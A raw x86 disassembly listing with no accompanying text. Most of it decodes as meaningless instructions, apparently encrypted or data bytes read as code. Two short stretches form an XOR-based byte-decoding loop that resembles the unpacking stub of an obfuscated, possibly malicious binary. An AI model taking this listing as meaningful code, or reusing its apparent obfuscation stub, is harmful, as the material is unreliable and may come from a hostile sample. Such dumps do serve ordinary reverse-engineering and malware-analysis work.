  40505e:	mov    al,cl
  405060:	jo     0x404feb
  405062:	mov    WORD PTR [edi-0x4fa6cb0a],ss
  405068:	adc    edi,DWORD PTR [ebp-0x34da16ce]
  40506e:	jmp    0xc7d37983
  405073:	gs mov al,0xb2
  405076:	inc    ebp
  405077:	push   cs
  405078:	das    
  405079:	push   cs
  40507a:	aad    0xa8
  40507c:	mov    esp,DWORD PTR [ecx-0x26]
  40507f:	lods   eax,DWORD PTR ds:[esi]
  405080:	inc    eax
  405081:	cld    
  405082:	mov    bl,0x4f
  405084:	xor    dh,BYTE PTR [eax+eax*1-0xa7a1a5a]
  40508b:	jae    0x405010
  40508d:	mov    bh,BYTE PTR [ebp+0x4b]
  405090:	rcr    BYTE PTR [ebx-0x5c],0xc2
  405094:	inc    ebp
  405095:	dec    ebp
  405096:	daa    
  405097:	mov    edx,0x3cd1af23
  40509c:	jno    0x405030
  40509e:	iret   
  40509f:	shr    DWORD PTR [edx+0x3f6617e],1
  4050a5:	aam    0x0
  4050a7:	js     0x405070
  4050a9:	popa   
  4050aa:	sub    ebx,DWORD PTR [edi-0x8eab5e5]
  4050b0:	sahf   
  4050b1:	xor    BYTE PTR [ecx],bh
  4050b3:	inc    esi
  4050b4:	in     al,dx
  4050b5:	push   ebp
  4050b6:	fdecstp 
  4050b8:	in     eax,0x9
  4050ba:	ror    BYTE PTR [ecx],cl
  4050bc:	test   ebx,ebx
  4050be:	pop    esi
  4050bf:	mov    edi,0x4145a49
  4050c4:	inc    ebp
  4050c5:	(bad)  
  4050c6:	out    dx,al
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x7b681f02],bh
  4050fc:	xchg   edx,eax
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x4050c7
  405106:	mov    ebx,0xd6fe2b28
  40510b:	loopne 0x4050ef
  40510d:	pop    edx
  40510e:	jle    0x405140
  405110:	adc    cl,BYTE PTR [ebx]
  405112:	jmp    0xd5831e75
  405117:	adc    al,ch
  405119:	sti    
  40511a:	outs   dx,BYTE PTR ds:[esi]
  40511b:	mov    ah,0x3e
  40511d:	jnp    0x40516f
  40511f:	add    eax,esi
  405121:	mov    ah,0x97
  405123:	jns    0x405174
  405125:	out    dx,eax
  405126:	mov    eax,ds:0x57d2428f
  40512b:	gs xor al,bl
  40512e:	fnstsw WORD PTR [ecx+0x72f1bb3d]
  405134:	jecxz  0x4051ae
  405136:	imul   ebx,DWORD PTR [ecx+0xadb125f],0x4c
  40513d:	daa    
  40513e:	pushf  
  40513f:	ins    BYTE PTR es:[edi],dx
  405140:	outs   dx,BYTE PTR ds:[esi]
  405141:	or     al,0x6b
  405143:	fisub  WORD PTR [ebx+0x12b13fec]
  405149:	out    dx,eax
  40514a:	(bad)  
  40514b:	fimul  DWORD PTR [ecx+eax*2-0x72]
  40514f:	pop    esi
  405150:	mov    ch,0x34
  405152:	sbb    DWORD PTR [ebp+0x1a9f6612],ecx
  405158:	lea    ecx,[eax+esi*4+0x34]
  40515c:	xor    eax,0x28453fa6
  405161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405162:	cmp    DWORD PTR ds:0xcc6c497a,0x17
  405169:	adc    BYTE PTR [esi+edi*1-0x65],al
  40516d:	sub    ecx,eax
  40516f:	jae    0x405131
  405171:	jae    0x40511a
  405173:	je     0x40517a
  405175:	add    dl,BYTE PTR [esi+0x7a]
  405178:	or     al,0x55
  40517a:	in     eax,0xe2
  40517c:	out    dx,al
  40517d:	aas    
  40517e:	add    DWORD PTR [ebx],esp
  405180:	pop    ebp
  405181:	adc    al,0xc4
  405183:	and    al,0xde
  405185:	mov    ch,0xdd
  405187:	mov    cl,0x82
  405189:	push   ebp
  40518a:	jb     0x40515b
  40518c:	cs push ebp
  40518e:	aaa    
  40518f:	push   0xae20a518
  405194:	add    cl,bh
  405196:	adc    eax,0x5902460
  40519b:	(bad)
  40519e:	xchg   esi,eax
  40519f:	lods   eax,DWORD PTR ds:[esi]
  4051a0:	or     DWORD PTR [eax],ecx
  4051a2:	arpl   WORD PTR [esi+edx*4],bx
  4051a5:	repnz sbb al,0xfb
  4051a8:	das    
  4051a9:	ss loop 0x40514d
  4051ac:	int    0xf0
  4051ae:	xchg   edx,eax
  4051af:	pop    esi
  4051b0:	out    0x14,al
  4051b2:	mov    al,cl
  4051b4:	push   esp
  4051b5:	fnstenv [edx]
  4051b7:	fdiv   st(7),st
  4051b9:	pop    ecx
  4051ba:	pop    es
  4051bb:	cmp    ah,ah
  4051bd:	xchg   ebx,eax
  4051be:	push   0xff571f5a
  4051c3:	(bad)  
  4051c4:	out    0xa1,al
  4051c6:	dec    ebx
  4051c7:	cmp    DWORD PTR [edx-0x8ffb759],esp
  4051cd:	out    dx,eax
  4051ce:	pusha  
  4051cf:	iret   
  4051d0:	sbb    BYTE PTR [ebx],dl
  4051d2:	shl    ebp,0xb6
  4051d5:	pop    ds
  4051d6:	pop    ds
  4051d7:	jnp    0x40524d
  4051d9:	cwde   
  4051da:	(bad)  
  4051db:	sub    eax,0x9849b786
  4051e0:	push   edx
  4051e1:	test   BYTE PTR [edi],dh
  4051e3:	pop    esi
  4051e4:	jns    0x405238
  4051e6:	int    0xfb
  4051e8:	inc    ecx
  4051e9:	bound  ebx,QWORD PTR [esi-0x4ca8eeb1]
  4051ef:	jae    0x4051de
  4051f1:	push   ebx
  4051f2:	les    ebp,FWORD PTR [edi]
  4051f4:	icebp  
  4051f5:	(bad)  
  4051f6:	cmc    
  4051f7:	loopne 0x405192
  4051f9:	out    dx,eax
  4051fa:	fldcw  WORD PTR [edx+0x57]
  4051fd:	les    esi,FWORD PTR [esi-0x18]
  405200:	inc    ecx
  405201:	mov    cl,0xb3
  405203:	xor    BYTE PTR [ebx-0x3c25e7d6],dh
  405209:	xor    ecx,DWORD PTR [ebx+0x54aeae05]
  40520f:	js     0x405272
  405211:	mov    al,0x25
  405213:	or     BYTE PTR [ecx],bh
  405215:	mov    dh,0x13
  405217:	inc    ebx
  405218:	pop    esp
  405219:	aad    0x8e
  40521b:	ja     0x4051fa
  40521d:	xor    cl,BYTE PTR [ebp+0x340dc6d9]
  405223:	sub    al,0x9b
  405225:	xor    al,0x96
  405227:	mov    BYTE PTR [ecx+0x3fab3aa],dh
  40522d:	xor    eax,0x71aca3c7
  405232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405233:	(bad)  
  405235:	sbb    al,0x36
  405237:	pushf  
  405238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405239:	fwait
  40523a:	add    al,0x51
  40523c:	in     al,0xe1
  40523e:	mov    eax,ds:0x24f3068d
  405243:	sbb    al,0x5
  405245:	sub    eax,edi
  405247:	mov    dh,0xb3
  405249:	clc    
  40524a:	push   ss
  40524b:	push   ds
  40524c:	pop    eax
  40524d:	bswap  ebp
  40524f:	lock sar BYTE PTR [eax],cl
  405252:	push   ebp
  405253:	rcl    DWORD PTR cs:[edx],1
  405256:	test   al,0x7d
  405258:	outs   dx,DWORD PTR ds:[esi]
  405259:	and    al,0x41
  40525b:	push   cs
  40525c:	sbb    al,BYTE PTR [edx]
  40525e:	ret    
  40525f:	sbb    BYTE PTR [ecx-0xfaf48a0],al
  405265:	inc    esi
  405266:	mov    esi,0xbf4bbb93
  40526b:	mov    BYTE PTR ds:0xc762e813,ch
  405271:	into   
  405272:	ds pop ecx
  405274:	adc    BYTE PTR [ebp-0x4],bh
  405277:	xchg   esp,eax
  405278:	ret    0x9f14
  40527b:	fcom   st(5)
  40527d:	outs   dx,DWORD PTR gs:[esi]
  40527f:	popf   
  405280:	outs   dx,BYTE PTR ds:[esi]
  405281:	ret    0x3df0
  405284:	mov    edx,0x587b21a4
  405289:	ds cmp edx,0xffffffd5
  40528d:	sub    ah,BYTE PTR [ebx+0x76cddf54]
  405293:	ins    DWORD PTR es:[edi],dx
  405294:	sbb    bl,al
  405296:	lds    ebp,FWORD PTR [esi-0x3d]
  405299:	stos   DWORD PTR es:[edi],eax
  40529a:	test   eax,0xf03ed31
  40529f:	jno    0x4052c9
  4052a1:	xchg   esi,eax
  4052a2:	adc    DWORD PTR [eax+0x22cd6e3b],ebp
  4052a8:	arpl   WORD PTR [eax-0x74],sp
  4052ab:	imul   ecx,DWORD PTR [ebp-0x7488cc71],0xea17f5b3
  4052b5:	mov    al,ds:0x2db43503
  4052ba:	nop
  4052bb:	pop    esp
  4052bc:	fistp  DWORD PTR [esi+0x2e4735d4]
  4052c2:	(bad)  
  4052c3:	imul   esp,DWORD PTR [esi+edx*4-0xe65be7a],0x25e77050
  4052ce:	das    
  4052cf:	mov    ch,0xb8
  4052d1:	mov    al,dh
  4052d3:	mov    dh,0x8d
  4052d5:	ja     0x405267
  4052d7:	popf   
  4052d8:	add    BYTE PTR [ebp-0x67],0x94
  4052dc:	mov    ch,0x47
  4052de:	call   0xd30eda53
  4052e3:	or     BYTE PTR [ebx+ebx*4],0xff
  4052e7:	sub    BYTE PTR [eax+0x202ab488],0x18
  4052ee:	xchg   esi,eax
  4052ef:	mov    ebp,0x1d529123
  4052f4:	sub    al,0x92
  4052f6:	and    BYTE PTR [eax-0x63e8854d],ch
  4052fc:	fidivr DWORD PTR [edi]
  4052fe:	jg     0x4052df
  405300:	clc    
  405301:	jne    0x405317
  405303:	(bad)  
  405304:	xchg   DWORD PTR ds:[ebx-0x40],ebx
  405308:	or     eax,0xd9d0ead6
  40530d:	retf   0x1b64
  405310:	xchg   ecx,eax
  405311:	xor    dh,BYTE PTR [ecx-0x1cd4cb2e]
  405317:	repnz or BYTE PTR [ecx-0x7e],dl
  40531b:	xor    ebx,ebp
  40531d:	mov    ch,BYTE PTR [edi+0x54]
  405320:	xor    bh,dh
  405322:	push   eax
  405323:	push   es
  405324:	sbb    ecx,DWORD PTR [esi+edx*8]
  405327:	cmp    ebp,edi
  405329:	out    dx,eax
  40532a:	gs push esp
  40532c:	dec    ebx
  40532d:	dec    edx
  40532e:	adc    dh,BYTE PTR [ecx]
  405330:	ins    BYTE PTR es:[edi],dx
  405331:	push   ebx
  405332:	(bad)  
  405333:	sbb    BYTE PTR [ecx],ch
  405335:	ror    BYTE PTR [ebx],cl
  405337:	xor    ecx,DWORD PTR [ebp-0x54]
  40533a:	addr16 test eax,0xfc8336f7
  405340:	lds    edi,FWORD PTR [edx]
  405342:	mov    ecx,0x1e085a52
  405347:	(bad)  
  405348:	cmp    esi,DWORD PTR [eax]
  40534a:	add    BYTE PTR ds:0x694d54b5,dl
  405350:	jl     0x405355
  405352:	mov    dl,0x2f
  405354:	fsub   st,st(1)
  405356:	fcom   QWORD PTR [ebp-0x50]
  405359:	xor    eax,0x109d370d
  40535e:	dec    ebp
  40535f:	push   ds
  405360:	fcom   DWORD PTR [esi+eiz*1+0x6d]
  405364:	mov    edx,0xccbea30b
  405369:	(bad)  
  40536a:	ror    BYTE PTR [esi-0x24],cl
  40536d:	xchg   ebx,eax
  40536e:	and    BYTE PTR [esi+0x71],dl
  405371:	pushf  
  405372:	jne    0x405350
  405374:	fstp   DWORD PTR [ecx-0x4b18e430]
  40537a:	pop    ebp
  40537b:	push   ds
  40537c:	sub    DWORD PTR [esi],eax
  40537e:	leave  
  40537f:	pushf  
  405380:	leave  
  405381:	rcl    BYTE PTR [eax+0x5e],1
  405384:	xor    bh,bh
  405386:	jp     0x4053b0
  405388:	ficomp WORD PTR [bp+di]
  40538b:	and    eax,0xa3b3e26d
  405390:	sbb    al,0xd3
  405392:	push   ds
  405393:	ret    
  405394:	ret    0xdc9e
  405397:	inc    ebx
  405398:	cmp    ebp,DWORD PTR [esi]
  40539a:	lds    esi,FWORD PTR [esi+eax*1+0x3e]
  40539e:	call   0xb498:0x58c0c3f0
  4053a5:	ret    0x6c4d
  4053a8:	icebp  
  4053a9:	cwde   
  4053aa:	idiv   BYTE PTR [edi-0x44]
  4053ad:	fmul   QWORD PTR [ebx]
  4053af:	pop    edi
  4053b0:	rcl    ah,0x89
  4053b3:	adc    dl,BYTE PTR [ebx+0x2f]
  4053b6:	cs jl  0x405401
  4053b9:	sbb    al,0x30
  4053bb:	imul   edi,esp,0xe81997ea
  4053c1:	adc    DWORD PTR [eax],esp
  4053c3:	sub    eax,0x5d455ca4
  4053c8:	add    esi,DWORD PTR ds:0xd858dbd5
  4053ce:	(bad)  
  4053cf:	mov    eax,0x315a87b2
  4053d4:	test   BYTE PTR [esi],al
  4053d6:	jae    0x405454
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fcom   QWORD PTR [ebp-0x6d]
  4053ee:	stos   DWORD PTR es:[edi],eax
  4053ef:	mov    bh,0x3d
  4053f1:	xor    eax,0x7e4d7878
  4053f6:	js     0x405470
  4053f8:	iret   
  4053f9:	add    bh,BYTE PTR [edi]
  4053fb:	jbe    0x40543c
  4053fd:	daa    
  4053fe:	cmc    
  4053ff:	test   eax,0x2347851f
  405404:	sbb    eax,0xa0a2ac80
  405409:	fcom   DWORD PTR [eax-0x616c5de1]
  40540f:	add    dh,BYTE PTR [eax+0x7034483f]
  405415:	pop    ds
  405416:	test   ebp,eax
  405418:	jns    0x40542a
  40541a:	adc    DWORD PTR [esi],ecx
  40541c:	or     BYTE PTR [ecx],cl
  40541e:	pop    ds
  40541f:	cld    
  405420:	popa   
  405421:	retf   0xeb60
  405424:	xor    edx,DWORD PTR [esi+0x2dd19582]
  40542a:	jl     0x4053e8
  40542c:	fcomp  QWORD PTR [ebx-0xcacc8c5]
  405432:	add    BYTE PTR [edx+0x40c96799],ah
  405438:	or     bh,BYTE PTR [ebp-0x1dd0ab71]
  40543e:	add    eax,0x831ab9c3
  405443:	push   edi
  405444:	dec    esp
  405445:	sar    BYTE PTR [edx-0x2868c618],cl
  40544b:	or     al,0xdc
  40544d:	jbe    0x40548c
  40544f:	test   eax,0x110a824c
  405454:	imul   ebx,DWORD PTR [ebp+0x17],0xf1bcc31a
  40545b:	inc    esp
  40545c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40545d:	das    
  40545e:	das    
  40545f:	sbb    esi,DWORD PTR [eax+0x40b52709]
  405465:	mov    BYTE PTR [esi-0x2b],dh
  405468:	inc    esp
  405469:	inc    esp
  40546a:	adc    DWORD PTR [eax],esi
  40546c:	mov    eax,ds:0x1f1458c1
  405471:	mov    ds:0x224fda80,eax
  405476:	imul   ecx,DWORD PTR [eax+0x55],0xc86a570d
  40547d:	pop    ss
  40547e:	push   0x1e
  405480:	in     eax,dx
  405481:	mov    edi,0x3f15ba8a
  405486:	in     eax,0xf8
  405488:	aad    0xc2
  40548a:	loope  0x4054c0
  40548c:	sub    bl,BYTE PTR [esi+0x23]
  40548f:	push   ecx
  405490:	jne    0x405418
  405492:	out    0x4d,al
  405494:	test   DWORD PTR [eax+0x24],esi
  405497:	test   al,0x11
  405499:	or     eax,0x8bac2fc3
  40549e:	rol    BYTE PTR [eax-0x54],cl
  4054a1:	inc    BYTE PTR [edi]
  4054a3:	data16 shl BYTE PTR [edx+0x10],1
  4054a7:	or     al,0x69
  4054a9:	sti    
  4054aa:	dec    ecx
  4054ab:	push   ss
  4054ac:	cmp    al,0x32
  4054ae:	std    
  4054af:	or     esi,ebx
  4054b1:	inc    edi
  4054b2:	xor    bl,0x20
  4054b5:	pop    es
  4054b6:	hlt    
  4054b7:	inc    ebx
  4054b8:	add    ah,ch
  4054ba:	or     edi,DWORD PTR [eax+0x43]
  4054bd:	xchg   esp,eax
  4054be:	fistp  QWORD PTR [eax+edx*1]
  4054c1:	dec    eax
  4054c2:	fldenv fs:[edx+0x3d9fe258]
  4054c9:	pop    es
  4054ca:	add    al,bl
  4054cc:	repz mov ecx,0xfcde5e10
  4054d2:	inc    esp
  4054d3:	mov    esi,0xda567301
  4054d8:	mov    eax,ds:0x81a14b92
  4054dd:	sub    DWORD PTR ds:0x466db8d0,eax
  4054e3:	mov    bl,0x76
  4054e5:	scas   al,BYTE PTR es:[edi]
  4054e6:	dec    esi
  4054e7:	mov    BYTE PTR [ebx-0x55],bl
  4054ea:	shl    bx,1
  4054ed:	mov    ?,WORD PTR [eax-0xa1489bb]
  4054f3:	jnp    0x4054cf
  4054f5:	pop    ds
  4054f6:	inc    esp
  4054f7:	in     al,0xf9
  4054f9:	out    0xae,al
  4054fb:	pop    edi
  4054fc:	and    DWORD PTR [ebp-0xb9c12c7],esi
  405502:	jns    0x405549
  405504:	sub    esi,0x5d
  405507:	jp     0x405557
  405509:	add    DWORD PTR [eax+0x654d289c],0x7b
  405510:	cmp    esp,DWORD PTR [edx]
  405512:	xlat   BYTE PTR ds:[ebx]
  405513:	jbe    0x4054f9
  405515:	cmp    al,bh
  405517:	fistp  WORD PTR [edx+edi*1-0x52]
  40551b:	pop    eax
  40551c:	stos   BYTE PTR es:[edi],al
  40551d:	fisubr WORD PTR [edx]
  40551f:	jb     0x4054d5
  405521:	imul   BYTE PTR ds:0xaa42b18a
  405527:	pop    esi
  405528:	out    dx,eax
  405529:	out    dx,al
  40552a:	call   0x710e:0x2474bde1
  405531:	pop    ebp
  405532:	(bad)  
  405533:	cwde   
  405534:	jmp    0x405590
  405536:	fcom   QWORD PTR [ebp-0x625ad558]
  40553c:	leave  
  40553d:	fadd   DWORD PTR [edx-0x61]
  405540:	mov    BYTE PTR [edx+0x68],bh
  405543:	dec    ecx
  405544:	xchg   edx,ebp
  405546:	(bad)  
  405547:	cmp    edi,eax
  405549:	and    al,BYTE PTR [ecx-0x3f07b50f]
  40554f:	mov    dh,ch
  405551:	and    eax,0x78655382
  405556:	adc    ecx,DWORD PTR [edi+0x74]
  405559:	(bad)  
  40555a:	mov    ah,0x84
  40555c:	pop    ecx
  40555d:	hlt    
  40555e:	adc    bl,BYTE PTR fs:[edx-0x575597df]
  405565:	js     0x4054eb
  405567:	push   edi
  405568:	int3   
  405569:	cmp    bl,BYTE PTR [edi-0x9720599]
  40556f:	push   ss
  405570:	inc    eax
  405571:	fs xchg esi,eax
  405573:	test   eax,0x5046d85f
  405578:	xchg   ebx,eax
  405579:	mov    edi,0xfa7f3f6e
  40557e:	dec    eax
  40557f:	jp     0x405510
  405581:	adc    DWORD PTR [eax+0x72],edx
  405584:	aad    0x1f
  405586:	mov    al,0x81
  405588:	cmc    
  405589:	std    
  40558a:	push   eax
  40558b:	shl    eax,0xb0
  40558e:	sub    DWORD PTR [edi],ebx
  405590:	xor    BYTE PTR [esi-0x20d77c7d],al
  405596:	push   ebx
  405597:	sahf   
  405598:	loop   0x4055cd
  40559a:	inc    esp
  40559b:	pop    ebx
  40559c:	daa    
  40559d:	out    dx,al
  40559e:	pop    ebp
  40559f:	pop    esp
  4055a0:	xchg   edi,eax
  4055a1:	jle    0x405546
  4055a3:	test   al,0x65
  4055a5:	test   eax,0xee6ea87
  4055aa:	test   eax,0xf42e3c81
  4055af:	adc    eax,0x8487ba8a
  4055b4:	mov    edx,0x6f19fdc0
  4055b9:	or     al,0x5e
  4055bb:	xchg   esp,eax
  4055bc:	scas   al,BYTE PTR es:[edi]
  4055bd:	xlat   BYTE PTR ds:[ebx]
  4055be:	test   eax,0xbbabd813
  4055c3:	mov    ds:0x9b099ab9,eax
  4055c8:	sub    eax,0x2341efe1
  4055cd:	inc    edx
  4055ce:	(bad)  
  4055cf:	in     al,dx
  4055d0:	ror    BYTE PTR [esi],cl
  4055d2:	ins    DWORD PTR es:[edi],dx
  4055d3:	ins    DWORD PTR es:[edi],dx
  4055d4:	lds    esi,FWORD PTR [eax+0x19]
  4055d7:	pop    ebx
  4055d8:	nop
  4055d9:	sbb    cl,BYTE PTR [edi-0x7d7d943]
  4055df:	das    
  4055e0:	jns    0x40562f
  4055e2:	icebp  
  4055e3:	popf   
  4055e4:	push   ebx
  4055e5:	lods   eax,DWORD PTR ds:[esi]
  4055e6:	stc    
  4055e7:	mov    eax,0x17da4965
  4055ec:	fsub   QWORD PTR [edi-0x1a85747e]
  4055f2:	ficom  DWORD PTR [ebx-0x50a233b6]
  4055f8:	nop
  4055f9:	int3   
  4055fa:	or     bl,BYTE PTR [ebx]
  4055fc:	repnz popa 
  4055fe:	push   0x7f
  405600:	aad    0xa7
  405602:	pop    eax
  405603:	and    ecx,esi
  405605:	js     0x405623
  405607:	xor    BYTE PTR [esi+0x6e1e98f8],dl
  40560d:	imul   ebp,DWORD PTR [edx+0x18],0x5a
  405611:	push   esp
  405612:	mov    WORD PTR [ecx],fs
  405614:	pop    ebx
  405615:	stos   DWORD PTR es:[edi],eax
  405616:	inc    edx
  405617:	ja     0x405692
  405619:	push   ebp
  40561a:	repz adc al,0xb7
  40561d:	dec    edi
  40561e:	xor    DWORD PTR ss:[edx+0x43],edx
  405622:	inc    esi
  405623:	jecxz  0x40565b
  405625:	test   eax,0x3ea69fd4
  40562a:	sbb    dl,0xa1
  40562d:	(bad)  
  40562e:	call   0x2fcd:0xb3031200
  405635:	fwait
  405636:	sbb    bh,BYTE PTR [ecx-0x52]
  405639:	test   DWORD PTR [esi-0x2a0e981a],ecx
  40563f:	imul   esi,DWORD PTR ds:0x86c88b12,0xffffffe6
  405646:	and    ah,dh
  405648:	out    0x84,al
  40564a:	inc    ebp
  40564b:	popf   
  40564c:	inc    esp
  40564d:	push   ecx
  40564e:	int    0x89
  405650:	in     al,dx
  405651:	repz add eax,0xa81eec22
  405657:	mov    eax,0xf0104f43
  40565c:	in     eax,dx
  40565d:	push   ecx
  40565e:	or     eax,0x9ab63c91
  405663:	jmp    0x9d79:0x36fd5077
  40566a:	lods   eax,DWORD PTR ds:[esi]
  40566b:	les    eax,FWORD PTR [esi+0x28d3cbae]
  405671:	sub    al,dh
  405673:	adc    edi,edx
  405675:	pop    ebx
  405676:	dec    ebp
  405677:	mov    ebx,0xa467dca3
  40567c:	aam    0xc6
  40567e:	jmp    0x4056c3
  405680:	push   ss
  405681:	in     al,dx
  405682:	xchg   DWORD PTR [ebp-0x41ccc658],esp
  405688:	retf   0xa3b9
  40568b:	bound  ecx,QWORD PTR [eax+0x75ca9bf0]
  405691:	inc    ecx
  405692:	mov    dl,0x5b
  405694:	inc    eax
  405695:	popf   
  405696:	imul   eax,DWORD PTR [ebp+0x61],0xffffffcd
  40569a:	sub    al,0x61
  40569c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40569d:	iret   
  40569e:	jno    0x40569f
  4056a0:	mov    cs,WORD PTR [eax+0x4c]
  4056a3:	or     bl,BYTE PTR [ebp+0x5c4145cb]
  4056a9:	xor    dl,al
  4056ab:	mov    eax,ds:0xdfbb4517
  4056b0:	es or  eax,0xac8ae9f6
  4056b6:	push   0xadfe342
  4056bb:	mov    edi,0xad4c858f
  4056c0:	pusha  
  4056c1:	hlt    
  4056c2:	sub    al,0x48
  4056c4:	stos   BYTE PTR es:[edi],al
  4056c5:	inc    ecx
  4056c6:	and    DWORD PTR [ebp+0x57],ebx
  4056c9:	rol    al,0x8b
  4056cc:	jge    0x4056ca
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	adc    dl,BYTE PTR [ecx]
  405714:	loopne 0x405721
  405716:	adc    bh,BYTE PTR [edx]
  405718:	js     0x405792
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x40574e
  40571f:	mov    ds:0x7329f2dd,al
  405724:	(bad)  
  405725:	xchg   DWORD PTR [eax],ecx
  405727:	shl    DWORD PTR [ecx+ebx*4+0x16],0xb1
  40572c:	aas    
  40572d:	fstp   QWORD PTR [ebx-0x78c66df8]
  405733:	add    DWORD PTR [ebp-0x5a3dbbed],ebx
  405739:	inc    edi
  40573a:	dec    edx
  40573b:	pop    ss
  40573c:	or     dh,bh
  40573e:	in     eax,dx
  40573f:	imul   esp,edx,0x12
  405742:	mov    ds:0xaa8d3b92,eax
  405747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405748:	adc    al,0x12
  40574a:	aas    
  40574b:	xchg   BYTE PTR [ebp+0x11b75f3],dh
  405751:	retf   0x48df
  405754:	scas   eax,DWORD PTR es:[edi]
  405755:	xchg   esp,eax
  405756:	popa   
  405757:	xchg   DWORD PTR [esi-0x7ccabbd4],eax
  40575d:	scas   al,BYTE PTR es:[edi]
  40575e:	cmp    edi,DWORD PTR ds:0xcb285b91
  405764:	outs   dx,DWORD PTR ds:[esi]
  405765:	pop    ebp
  405766:	aam    0x40
  405768:	or     DWORD PTR [ebx+0x5b848f02],0x12181a8b
  405772:	push   es
  405773:	mov    al,ds:0xdd462064
  405778:	stos   BYTE PTR es:[edi],al
  405779:	dec    esp
  40577a:	stos   BYTE PTR es:[edi],al
  40577b:	and    esp,ecx
  40577d:	and    al,0xc7
  40577f:	sbb    DWORD PTR [eax],ecx
  405781:	push   cs
  405782:	les    ebx,FWORD PTR [ecx]
  405784:	pop    esi
  405785:	xchg   ebx,eax
  405786:	or     BYTE PTR [esi-0x42e92afc],ch
  40578c:	jmp    0xde66:0xf035aac7
  405793:	xchg   ecx,eax
  405794:	lods   al,BYTE PTR ds:[esi]
  405795:	jae    0x405735
  405797:	cmc    
  405798:	retf   0x363e
  40579b:	aaa    
  40579c:	fmul   QWORD PTR [esi+ebx*1-0x48e34700]
  4057a3:	cmp    eax,0x2094b5b9
  4057a8:	div    BYTE PTR [eax]
  4057aa:	ret    0x2111
  4057ad:	adc    ah,BYTE PTR [edi+0x19]
  4057b0:	xor    BYTE PTR [ecx],bh
  4057b2:	inc    esp
  4057b3:	push   ebx
  4057b4:	dec    edi
  4057b5:	adc    esi,edi
  4057b7:	push   eax
  4057b8:	mov    ah,0xc3
  4057ba:	hlt    
  4057bb:	ja     0x40580a
  4057bd:	leave  
  4057be:	or     esi,DWORD PTR [esi+0x7a]
  4057c1:	shl    DWORD PTR [ebx-0x3ea30198],1
  4057c7:	call   0x2523:0x18165b78
  4057ce:	ror    DWORD PTR [esi+0x759cf10e],1
  4057d4:	inc    eax
  4057d5:	xor    BYTE PTR [ebp-0x5],dl
  4057d8:	push   edx
  4057d9:	stos   BYTE PTR es:[edi],al
  4057da:	push   0xffffffae
  4057dc:	lahf   
  4057dd:	sub    DWORD PTR [edi-0xe17ffc2],ebx
  4057e3:	sar    BYTE PTR [ecx],cl
  4057e5:	les    ecx,FWORD PTR [esi-0x3227e2a7]
  4057eb:	in     al,0xb4
  4057ed:	mul    DWORD PTR [eax+ebp*4]
  4057f0:	addr16 push ecx
  4057f2:	jg     0x405850
  4057f4:	sbb    DWORD PTR [edx+0xa807113],eax
  4057fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057fb:	(bad)  
  4057fc:	pop    ebx
  4057fd:	add    eax,0x5cf45815
  405802:	shr    BYTE PTR [edi+0x9],0xdf
  405806:	cmc    
  405807:	(bad)  
  405808:	ror    BYTE PTR [ebx+0x238c40bd],cl
  40580e:	pushw  ss
  405810:	shl    DWORD PTR [edx+eax*4-0x391c9a3a],1
  405817:	jmp    0x405854
  405819:	sub    dl,ch
  40581b:	and    dh,BYTE PTR [eax+0x50]
  40581e:	add    edi,ebp
  405820:	scas   eax,DWORD PTR es:[edi]
  405821:	pop    edx
  405822:	mov    ebx,0xa91862ce
  405827:	adc    bh,BYTE PTR [edx-0x5bfd2a42]
  40582d:	lea    ebx,[ecx-0x3c]
  405830:	lods   eax,DWORD PTR ds:[esi]
  405831:	or     esi,DWORD PTR [eax+0x2cc9c966]
  405837:	mov    ds:0x764cf76d,eax
  40583c:	iret   
  40583d:	adc    al,0x19
  40583f:	cmp    ebx,DWORD PTR [ecx-0x161afe79]
  405845:	xchg   edi,eax
  405846:	adc    ecx,DWORD PTR [ebp-0x1c]
  405849:	neg    BYTE PTR [ebx]
  40584b:	xor    DWORD PTR [ecx+0x486c5915],esp
  405851:	pop    es
  405852:	(bad)  
  405853:	push   edi
  405854:	sbb    DWORD PTR [edx-0x1d0eb861],0x5f386ceb
  40585e:	shl    BYTE PTR [ebp-0x24bbd86c],1
  405864:	sbb    eax,DWORD PTR [eax-0x7f]
  405867:	mov    al,ds:0xbb8cf7
  40586c:	xchg   esp,eax
  40586d:	jl     0x405838
  40586f:	retf   
